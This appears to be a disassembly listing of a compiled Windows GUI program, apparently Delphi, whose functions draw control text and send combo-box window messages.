add [ eax ] 0x0
add [ eax ] al
adc al 0x0
add al 0x4b
imul ebp [ esi + 0x64 ] r-xdata
and al [ edx ]
add bh bh
and al [ edx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc eax 0x614c0b00
jb r-xdata
jb r-xdata
adc [ eax ] al
inc ebx
push 0x65676e61
cmp al 0x10
inc eax
add [ edx + eax ] dl
add bh bh
insb
sub al [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax + eax ] 0x0
push ss
add [ ebx ] al
dec ebp
popad
js r-xdata
inc esp
add [ eax + eax ] dh
jmp [ eax + 0x10044b4 ]
in al dx
inc edx
inc ecx
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
pushad
add [ eax ] al
[ eax + eax ]
push ebx
imul edi [ edx + 0x65 ] r-xdata
adc [ eax ] al
adc [ edx ] al
add bh bh
push esp
sub al [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ ebx ] al
dec ebp
imul ebp [ esi + 0x3c ] 0x18004010
add al [ eax ]
sub_43f24c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_451418
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_448748
mov edx 0x69
mov eax esi
call sub_44876c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_43f2a8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44b820
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_42508c
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_424fe8
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_43f314
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_43f6b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_42508c
call sub_43aed8
call sub_43afb8
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_424fe8
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_448fb4
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_417264
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_417264
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_448fb4
mov eax [ ebp - 0x54 ]
call sub_404424
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_448fb4
mov eax [ ebp - 0x58 ]
call sub_404624
push eax
mov eax edi
call sub_42516c
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_417264
mov eax ebx
mov si 0xffc8
call sub_403564
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_4249a4
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_4249a4
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_424d84
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_4249a4
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_42516c
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f6bd
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_404188
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_404188
lea eax [ ebp - 0x60 ]
call sub_404844
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_404188
retn
mov eax ebx
mov si 0xffc8
call sub_403564
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_424d84
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_448fb4
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_448fb4
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_424fcc
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_417264
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_417264
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_448fb4
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_404990
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_42516c
push eax
call sub_43aed8
lea ecx [ ebp - 0x4c ]
pop edx
call sub_43b120
jmp r-xdata
call sub_43aed8
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_43b184
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_42516c
push eax
call sub_43aed8
lea ecx [ ebp - 0x4c ]
pop edx
call sub_43b074
push 0x0
mov eax edi
call sub_42516c
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_448fb4
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_44b2ac
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_448fb4
mov eax [ ebp - 0x80 ]
call sub_404424
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_448fb4
mov eax [ ebp - 0x84 ]
call sub_404624
push eax
mov eax edi
call sub_42516c
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_4249a4
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_448fb4
mov eax [ ebp - 0x88 ]
call sub_404424
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_448fb4
mov eax [ ebp - 0x8c ]
call sub_404624
push eax
mov eax edi
call sub_42516c
push eax
call DrawTextA
sub_43f6c7
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43f742
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_448fb4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45fcd0
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44ec38
mov eax ebx
mov si 0xffb8
call sub_403564
test al al
je r-xdata
mov eax ebx
call sub_44fd14
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f749
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_43f794
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4509dc
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_448748
mov edx 0x11
mov eax esi
call sub_44876c
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_43aed8
call sub_43afb8
test al al
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_43f840
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43f996
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44b2ac
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_42508c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40442c
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404424
push eax
mov eax [ ebp - 0x4 ]
call sub_404624
push eax
mov eax [ ebx + 0x160 ]
call sub_42516c
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_4241d8
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404424
push eax
mov eax [ ebp - 0x4 ]
call sub_404624
push eax
mov eax [ ebx + 0x160 ]
call sub_42516c
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_4241d8
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404424
push eax
mov eax [ ebp - 0x4 ]
call sub_404624
push eax
mov eax [ ebx + 0x160 ]
call sub_42516c
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f99d
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_43f9a7
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_43fbd0
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_424ac0
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_4249a4
xor edx edx
mov eax [ esi + 0x14 ]
call sub_424ac0
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_424d48
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_403564
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_403564
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_43fac8
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_4251ec
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_403564
xor edx edx
mov eax [ edi + 0x160 ]
call sub_4251ec
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_403564
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_445d6c
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_43fc0c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43fbd0
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43fc6c
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_403564
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43fc94
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44845c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_43fcf8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43fd85
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fd8c
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_448fb4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45fcd0
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_403564
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_43fdf8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43fe5e
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push edi
push 0x150
mov eax [ ebx + 0x10 ]
call sub_44f7b4
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fe65
lea eax [ ebp - 0x4 ]
call sub_404164
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_419ca4
sub_43fe70
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x151
mov eax [ ebx + 0x10 ]
call sub_44f7b4
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_43fe94
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
push 0x0
push edi
push 0x149
mov eax [ ebx + 0x10 ]
call sub_44f7b4
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax esi
xor edx edx
call sub_4047b0
mov edx esi
xchg edx eax
call sub_4047b0
mov eax [ esi ]
call sub_404624
push eax
push edi
push 0x148
mov eax [ ebx + 0x10 ]
call sub_44f7b4
push eax
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43feec
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43ff50
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_448fb4
push 0x0
push 0x0
push 0x14b
mov eax [ ebx + 0x10 ]
call sub_44f7b4
push eax
call SendMessageA
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_448fe4
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x88 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ff57
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_43ff5c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x144
mov eax [ ebx + 0x10 ]
call sub_44f7b4
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_43ff7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404624
push eax
push 0xffffffff
push 0x158
mov eax [ ebx + 0x10 ]
call sub_44f7b4
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_43ffa4
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_44f7b4
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_4494f0
sub_43ffd8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44004b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404624
push eax
push 0x0
push 0x143
mov eax [ ebx + 0x10 ]
call sub_44f7b4
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440052
lea eax [ ebp - 0x4 ]
call sub_404164
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
sub_44005c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4400cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_404624
push eax
push esi
push 0x14a
mov eax [ ebx + 0x10 ]
call sub_44f7b4
push eax
call SendMessageA
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4400d6
lea eax [ ebp - 0x4 ]
call sub_404164
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
sub_4400dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44b4e0
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x91
mov eax ebx
call sub_448748
mov edx 0x19
mov eax ebx
call sub_44876c
mov dl 0x1
mov eax ebx
call sub_44f9e8
xor edx edx
mov eax ebx
call sub_449178
mov dl 0x1
mov eax [ r-xdata ]
call sub_424af4
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_447b68
mov [ ebx + 0x238 ] 0x10
push ebx
push sub_440480
call sub_422214
mov [ ebx + 0x24c ] eax
push ebx
push sub_440578
call sub_422214
mov [ ebx + 0x254 ] eax
mov [ ebx + 0x210 ] 0x8
mov [ ebx + 0x214 ] 0xffffffff
mov [ ebx + 0x260 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_4401d0
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax esi
call sub_44fab8
test al al
je r-xdata
mov eax [ esi + 0x254 ]
call sub_45fbec
mov eax [ esi + 0x24c ]
call sub_45fbec
mov eax [ esi + 0x208 ]
call sub_403368
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44b604
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_440252
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_44cba8
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
xor eax eax
mov [ ebx + 0x248 ] eax
pop ebx
retn
sub_44029c
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x157
mov eax ebx
call sub_44f7b4
push eax
call SendMessageA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_4402c0
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
push 0x0
xor eax eax
mov al bl
push eax
push 0x14f
mov eax esi
call sub_44f7b4
push eax
call SendMessageA
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax esi
call sub_44f7b4
push eax
call InvalidateRect
add esp 0x10
pop esi
pop ebx
retn
sub_440308
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
push 0x0
push 0x0
push 0x147
mov eax ebx
call sub_44f7b4
push eax
call SendMessageA
pop ebx
retn
mov eax [ ebx + 0x214 ]
pop ebx
retn
sub_440334
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
mov [ ebx + 0x214 ] esi
pop esi
pop ebx
retn
pop esi
pop ebx
retn
push 0x0
push esi
push 0x14e
mov eax ebx
call sub_44f7b4
push eax
call SendMessageA
sub_440370
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jge r-xdata
cmp esi [ ebx + 0x20c ]
je r-xdata
xor esi esi
pop esi
pop ebx
retn
mov [ ebx + 0x20c ] esi
mov eax ebx
call sub_44fab8
test al al
je r-xdata
push 0x0
push esi
push 0x141
mov eax ebx
call sub_44f7b4
push eax
call SendMessageA
sub_4403c0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x64 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x64 ]
push eax
mov eax esi
call sub_44f7b4
push eax
call SetWindowTextA
sub_4403fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_44029c
test al al
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x4
sub_440434
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44edcc
pop esi
pop ebx
retn
mov eax ebx
call sub_44cd54
sub_440458
push ebx
mov ebx eax
mov eax ebx
call sub_44aba4
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_440480
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ esi ] 0x112
jne r-xdata
mov eax [ esi ]
cmp eax 0x100
jb r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
jmp r-xdata
mov eax [ ebx + 0x250 ]
push eax
mov edx esi
mov ecx [ ebx + 0x240 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xf4 ]
mov eax [ esi ]
sub eax 0x30
je r-xdata
cmp eax 0x108
ja r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x1d1
je r-xdata
mov eax ebx
call sub_45fd40
mov edi eax
test edi edi
je r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
sub eax 0x2
jne r-xdata
mov ecx esi
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_448af8
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406e5c
push eax
push 0x0
push 0x202
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_449674
jmp r-xdata
sub_4405ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_440863
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x104
jg r-xdata
cmp eax 0xbd00
jg r-xdata
je r-xdata
sub eax 0xbd02
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x244 ]
je r-xdata
cmp eax 0x87
jg r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
sub eax 0x105
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
mov eax [ ebp + 0x8 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
cmp [ ebx ] 0x203
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44e608
test al al
je r-xdata
sub eax 0x100
je r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
